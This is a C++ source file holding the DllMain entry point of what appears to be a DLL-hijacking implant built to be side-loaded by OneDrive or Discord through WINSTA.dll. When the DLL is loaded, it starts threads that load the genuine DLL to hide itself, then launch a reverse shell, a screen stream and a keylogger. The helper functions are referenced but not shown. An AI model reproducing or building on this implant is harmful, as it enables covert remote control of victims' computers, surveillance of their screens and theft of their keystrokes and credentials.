#include <windows.h>
#include "functions.hpp"

// Remove definition to build for Discord (WINSTA.dll)
#define ONEDRIVE

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    // Can't use LoadLibrary in DllMain, so we create a thread for loading the original DLL in the parent process
    #ifdef ONEDRIVE
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) load_onedrive_dll, hModule, NULL, NULL);
    #else
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) load_discord_dll, hModule, NULL, NULL);
    #endif
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) load_rshell, hModule, NULL, NULL);
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) load_stream, hModule, NULL, NULL);
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) load_klog, hModule, NULL, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
